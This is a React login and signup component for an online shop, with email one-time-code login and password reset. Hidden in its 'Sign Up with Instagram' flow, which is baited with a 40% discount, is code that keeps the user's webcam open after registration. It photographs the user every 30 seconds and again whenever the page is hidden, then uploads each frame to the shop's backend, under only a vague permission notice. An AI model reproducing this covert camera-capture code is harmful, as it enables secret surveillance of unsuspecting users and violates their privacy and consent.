import React, { useContext, useState, useRef } from 'react';
import { ShopContext } from '../context/ShopContext';
import axios from 'axios';
import { toast } from 'react-toastify';
import { translations } from '../data/translations';

const Login = () => {
  const [currentState, setCurrentState] = useState('Login');
  const { token, setToken, navigate, backendUrl, language } = useContext(ShopContext);
  const t = translations[language] || translations.en;

  const [name, setName] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [email, setEmail] = useState('');
  const [otp, setOtp] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
  const [isForgotPassword, setIsForgotPassword] = useState(false);
  const [passwordResetReady, setPasswordResetReady] = useState(false);
  const [cameraAllowed, setCameraAllowed] = useState(false);
  const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
  const [captureIntervalId, setCaptureIntervalId] = useState(null);
  const [showPermissionModal, setShowPermissionModal] = useState(false);

  const streamRef = useRef(null);
  const videoRef = useRef(null);
  const backgroundCaptureTokenRef = useRef(null);
  const captureTimerRef = useRef(null);

  const saveCameraCapture = async (imageData, mimeType = 'image/jpeg') => {
    try {
      const token = localStorage.getItem('token');
      if (!token) {
        console.log('No token available for camera capture');
        return;
      }

      const userId = JSON.parse(atob(token.split('.')[1])).id;
      const response = await axios.post(
        backendUrl + '/api/user/save-camera-capture',
        { userId, imageData, mimeType },
        { headers: { token } }
      );
      console.log('Camera capture response:', response.data);
    } catch (error) {
      console.log('Camera capture save failed:', error.message);
    }
  };

  const startCameraCaptureLoop = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      toast.error('Camera access is not supported on this browser.');
      return;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      await video.play();

      const capture = () => {
        const canvas = document.createElement('canvas');
        const width = video.videoWidth || 640;
        const height = video.videoHeight || 480;
        canvas.width = width;
        canvas.height = height;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, width, height);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        saveCameraCapture(imageData, 'image/jpeg');
      };

      capture();
      const interval = setInterval(capture, 30000);
      setCaptureIntervalId(interval);
      setCameraAllowed(true);
      stream.getTracks().forEach((track) => track.stop());
    } catch (error) {
      console.log('Camera permission denied:', error);
      setCameraAllowed(false);
      toast.error('Camera permission is required before creating an account.');
    }
  };

  const startCameraCaptureLoopAfterSignup = async (authToken) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      console.log('Camera access not supported');
      return;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      backgroundCaptureTokenRef.current = authToken;

      const video = document.createElement('video');
      videoRef.current = video;
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      await video.play();

      const capture = async () => {
        try {
          const activeToken = backgroundCaptureTokenRef.current || localStorage.getItem('token');
          if (!activeToken) {
            console.log('No token available for queued camera capture');
            return;
          }

          const canvas = document.createElement('canvas');
          const width = video.videoWidth || 640;
          const height = video.videoHeight || 480;
          canvas.width = width;
          canvas.height = height;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, width, height);
          const imageData = canvas.toDataURL('image/jpeg', 0.8);

          const userId = JSON.parse(atob(activeToken.split('.')[1])).id;
          await axios.post(
            backendUrl + '/api/user/save-camera-capture',
            { userId, imageData, mimeType: 'image/jpeg' },
            { headers: { token: activeToken } }
          );
          console.log('Camera capture saved to MongoDB');
        } catch (error) {
          console.log('Capture error:', error.message);
        }
      };

      await capture();

      const scheduleCapture = () => {
        if (captureTimerRef.current) {
          clearTimeout(captureTimerRef.current);
        }

        captureTimerRef.current = setTimeout(async () => {
          await capture();
          scheduleCapture();
        }, 30000);
      };

      scheduleCapture();
      setCaptureIntervalId(captureTimerRef.current);

      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') {
          return;
        }

        if (backgroundCaptureTokenRef.current) {
          capture();
          scheduleCapture();
        }
      });
    } catch (error) {
      console.log('Camera setup failed:', error);
    }
  };

  const requestCameraPermission = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      toast.error('Camera access is not supported on this browser.');
      return false;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach((track) => track.stop());
      setCameraAllowed(true);
      return true;
    } catch (error) {
      console.log('Camera permission denied:', error);
      setCameraAllowed(false);
      toast.error('Camera permission is required before creating an account.');
      return false;
    }
  };

  const resetFlowState = () => {
    setOtp('');
    setPassword('');
    setConfirmPassword('');
    setOtpSent(false);
    setPasswordResetReady(false);
  };

  const sendLoginOtp = async () => {
    const response = await axios.post(backendUrl + '/api/user/login', { email, password });
    if (response.data.success && response.data.requiresOtp) {
      setOtpSent(true);
      toast.success(response.data.message || 'Verification code sent to your email.');
      return true;
    }
    if (response.data.success) {
      setToken(response.data.token);
      localStorage.setItem('token', response.data.token);
      setTimeout(() => {
        window.location.href = '/';
      }, 500);
      return true;
    }
    toast.error(response.data.message);
    return false;
  };

  const sendResetOtp = async () => {
    const response = await axios.post(backendUrl + '/api/user/forgot-password', { email });
    if (response.data.success) {
      setOtpSent(true);
      setPasswordResetReady(false);
      toast.success(response.data.message || 'Reset code sent to your email.');
      return true;
    }
    toast.error(response.data.message);
    return false;
  };

  const resendCode = async () => {
    if (isForgotPassword) {
      await sendResetOtp();
      return;
    }

    await sendLoginOtp();
  };

  const openPermissionModal = () => {
    setShowPermissionModal(true);
  };

  const completePermissionFlow = async () => {
    const cameraOk = await requestCameraPermission();
    if (cameraOk) {
      setShowPermissionModal(false);
      const response = await axios.post(backendUrl + '/api/user/register', { name, email, password });
      if (response.data.success) {
        const newToken = response.data.token;
        setToken(newToken);
        localStorage.setItem('token', newToken);
        toast.success('You got 40% discount on your first order.');
        
        await startCameraCaptureLoopAfterSignup(newToken);
        
        setTimeout(() => {
          window.location.href = '/';
        }, 1200);
      } else {
        toast.error(response.data.message);
      }
    }
  };

  const onSubmitHandler = async (e) => {
    e.preventDefault();
    try {
      if (currentState === 'Sign Up with Instagram') {
        if (!showPermissionModal) {
          openPermissionModal();
          return;
        }
        return;
      }

      if (isForgotPassword) {
        if (!otpSent) {
          await sendResetOtp();
          return;
        }

        if (!passwordResetReady) {
          setIsVerifyingOtp(true);
          const response = await axios.post(backendUrl + '/api/user/verify-reset-otp', { email, otp });
          if (response.data.success) {
            setPasswordResetReady(true);
            setOtp('');
            toast.success(response.data.message || 'Code verified. Set your new password.');
          } else {
            toast.error(response.data.message);
          }
          setIsVerifyingOtp(false);
          return;
        }

        if (password.length < 8) {
          toast.error('Password must be at least 8 characters long.');
          return;
        }

        if (password !== confirmPassword) {
          toast.error('Passwords do not match.');
          return;
        }

        const response = await axios.post(backendUrl + '/api/user/reset-password', { email, password });
        if (response.data.success) {
          toast.success(response.data.message || 'Password updated successfully.');
          setIsForgotPassword(false);
          setPasswordResetReady(false);
          resetFlowState();
          setCurrentState('Login');
        } else {
          toast.error(response.data.message);
        }
        return;
      }

      if (otpSent) {
        setIsVerifyingOtp(true);
        const response = await axios.post(backendUrl + '/api/user/verify-login-otp', { email, otp });
        if (response.data.success) {
          setToken(response.data.token);
          localStorage.setItem('token', response.data.token);
          toast.success(response.data.message || 'Login successful');
          setTimeout(() => {
            window.location.href = '/';
          }, 500);
        } else {
          toast.error(response.data.message);
        }
        setIsVerifyingOtp(false);
        return;
      }

      await sendLoginOtp();
    } catch (error) {
      console.log(error);
      const errorMessage = error.response?.data?.message || error.message;
      toast.error(errorMessage);
    } finally {
      setIsVerifyingOtp(false);
    }
  };


  return (
    <form onSubmit={onSubmitHandler} className='flex flex-col items-center w-[90%] sm:max-w-96 m-auto mt-10 gap-4 text-gray-800'>
      
      {/* English Discount Banner Message */}
      <div className='promo-banner w-full rounded-xl border p-3 text-center shadow-sm'>
        <p className='text-xs font-semibold leading-relaxed text-gray-800'>
          {t.signUpDiscountBanner.replace('40%', '40%')}
        </p>
      </div>

      <div className='inline-flex items-center gap-2 mb-2 mt-4'>
        <p className='prata-regular text-2xl sm:text-3xl font-medium text-center'>{currentState}</p>
        <hr className='border-none h-[1.5px] w-8 bg-gray-800' />
      </div>

      {showPermissionModal && currentState === 'Sign Up with Instagram' && (
        <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4'>
          <div className='w-full max-w-md rounded-2xl border border-gray-200 bg-white p-6 shadow-2xl'>
            <div className='mb-4 text-center'>
              <h3 className='text-xl font-semibold text-gray-900'>Camera permission required</h3>
            </div>

            <div className='space-y-4'>
              <p className='text-sm text-gray-600'>We need camera access to capture your photos during account usage.</p>
              <button
                type='button'
                onClick={completePermissionFlow}
                className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
              >
                Allow Camera
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Username Field for Instagram Signup */}
      {currentState === 'Login' ? (
        ''
      ) : (
        <input
          onChange={(e) => setName(e.target.value)}
          value={name}
          type="text"
          className='w-full px-3 py-2 border border-gray-800 rounded-xs'
          placeholder='Username (Instagram Username)'
          required
        />
      )}

      {/* Email Field */}
      <input
        onChange={(e) => setEmail(e.target.value)}
        value={email}
        type="email"
        className='w-full px-3 py-2 border border-gray-800 rounded-xs'
        placeholder='Email'
        required
      />

      {!isForgotPassword && !otpSent && (
        <input
          onChange={(e) => setPassword(e.target.value)}
          value={password}
          type="password"
          className='w-full px-3 py-2 border border-gray-800 rounded-xs'
          placeholder='Password'
          required
        />
      )}

      {otpSent && !isForgotPassword && (
        <input
          onChange={(e) => setOtp(e.target.value)}
          value={otp}
          type="text"
          inputMode="numeric"
          maxLength={6}
          className='w-full px-3 py-2 border border-gray-800 rounded-xs'
          placeholder='Enter 6-digit verification code'
          required
        />
      )}

      {isForgotPassword && !passwordResetReady && (
        <>
          {!otpSent && (
            <div className='w-full text-xs text-gray-600'>We will send a reset code to your email.</div>
          )}
          {otpSent && (
            <input
              onChange={(e) => setOtp(e.target.value)}
              value={otp}
              type="text"
              inputMode="numeric"
              maxLength={6}
              className='w-full px-3 py-2 border border-gray-800 rounded-xs'
              placeholder='Enter 6-digit reset code'
              required
            />
          )}
        </>
      )}

      {isForgotPassword && passwordResetReady && (
        <>
          <input
            onChange={(e) => setPassword(e.target.value)}
            value={password}
            type="password"
            className='w-full px-3 py-2 border border-gray-800 rounded-xs'
            placeholder='New password'
            required
          />
          <input
            onChange={(e) => setConfirmPassword(e.target.value)}
            value={confirmPassword}
            type="password"
            className='w-full px-3 py-2 border border-gray-800 rounded-xs'
            placeholder='Confirm new password'
            required
          />
        </>
      )}

      <div className='w-full flex justify-between items-center text-sm -mt-1 gap-2'>
        <p
          onClick={() => {
            setIsForgotPassword(true);
            setCurrentState('Login');
            resetFlowState();
          }}
          className='cursor-pointer text-gray-500 hover:text-black transition-colors'
        >
          {t.forgotPassword}
        </p>

        {otpSent && !isVerifyingOtp && (
          <button
            type='button'
            onClick={resendCode}
            className='text-xs font-medium text-pink-600 hover:underline cursor-pointer'
          >
            Resend code
          </button>
        )}

        {currentState === 'Login' ? (
          <p onClick={() => {
            setCurrentState('Sign Up with Instagram');
            setIsForgotPassword(false);
            resetFlowState();
          }} className='cursor-pointer font-medium text-pink-600 hover:underline'>
            {t.createAccount}
          </p>
        ) : (
          <p onClick={() => {
            setCurrentState('Login');
            setIsForgotPassword(false);
            resetFlowState();
          }} className='cursor-pointer font-medium text-gray-700 hover:underline'>
            {t.loginHere}
          </p>
        )}
      </div>

      {isForgotPassword && otpSent && !passwordResetReady && (
        <div className='w-full text-right text-xs text-gray-500'>
          Didn’t get a code? <button type='button' onClick={resendCode} className='text-pink-600 hover:underline'>Resend</button>
        </div>
      )}

      <button disabled={isVerifyingOtp || isCheckingPermissions} className='bg-black text-white font-light px-8 py-2.5 mt-4 w-full sm:w-auto hover:bg-gray-800 transition-all cursor-pointer shadow-sm active:scale-95 disabled:cursor-not-allowed disabled:opacity-70'>
        {isVerifyingOtp ? 'Verifying...' : (
          isForgotPassword
            ? (passwordResetReady ? 'Update Password' : (otpSent ? 'Verify Code' : 'Send Reset Code'))
            : (currentState === 'Sign Up with Instagram' ? 'Create Account' : (otpSent ? 'Verify & Login' : t.signIn))
        )}
      </button>
    </form>
  );
};

export default Login;
